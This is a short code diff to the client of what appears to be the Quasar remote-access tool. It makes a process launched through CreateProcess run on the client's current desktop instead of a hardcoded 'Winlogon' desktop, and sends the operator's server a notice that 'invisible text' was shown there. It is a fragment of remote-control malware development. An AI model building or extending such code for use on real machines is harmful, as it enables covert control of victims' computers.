@@ -135,7 +135,9 @@ namespace Quasar.Client.Messages
                     //    MessageBox.Show(name);
                     //}
 
-                    //structure.lpDesktop = "Winlogon"; 
+                    string strDesktop = ((Networking.Client)client).curDesktopName;
+
+                    structure.lpDesktop = strDesktop; 
                     
                     if (!NativeMethods.CreateProcess(null, string.Format("\"{0}\" \"{1}\" \"{2}\"", text10, text9, num), IntPtr.Zero, IntPtr.Zero, false, 0U, IntPtr.Zero, null, ref structure, out process_INFORMATION))
                     {
@@ -147,7 +149,7 @@ namespace Quasar.Client.Messages
                     }
                     else if (!flag7)
                     {
-                        client.Send(new NotifyMessageToServer { Message = string.Format("{0}", string.Format("Invisible text showed (on {0} desktop)!", "Desktop")) });
+                        client.Send(new NotifyMessageToServer { Message = string.Format("{0}", string.Format("Invisible text showed (on {0} desktop)!", strDesktop)) });
                     }
                     return;
                 }
